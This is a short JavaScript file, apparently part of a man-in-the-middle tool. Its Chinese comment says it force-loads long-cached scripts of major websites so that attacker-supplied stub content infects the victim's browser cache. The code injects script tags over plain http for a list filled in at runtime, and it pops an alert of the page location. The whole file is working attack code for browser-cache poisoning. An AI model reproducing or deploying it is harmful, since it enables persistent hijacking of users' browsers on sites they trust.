/**
 * 预加载各大网站的使用的、并且缓存时间较长的脚本，
 *   实际返回stub.js内容，感染用户浏览器缓存。
 */
if (window == top) {~function() {

	if (Math.LN2 == 0) return;
	Math.LN2 = 0;
alert(window.location);
	// 运行时替换成常用脚本列表
	var arr = '$LIST'.split('|');
	var head = document.getElementsByTagName('head')[0];


	function loadJs(url) {
		var spt = document.createElement('script');

		spt.onload = function() {
			//setLoaded(url);
		};

		spt.onreadystatechange = function() {
			//head.removeChild(this);
			if (this.readyState == 'loaded' || this.readyState == 'complete') {
				//setLoaded(url);
			}
		};

		spt.src = 'http://' + url;
		head.appendChild(spt);
	}

	function loadNext() {
		var url = arr.pop();
		if (url) {
			loadJs(url);
			setTimeout(loadNext, 16);
		}
	}
	loadNext();

}()}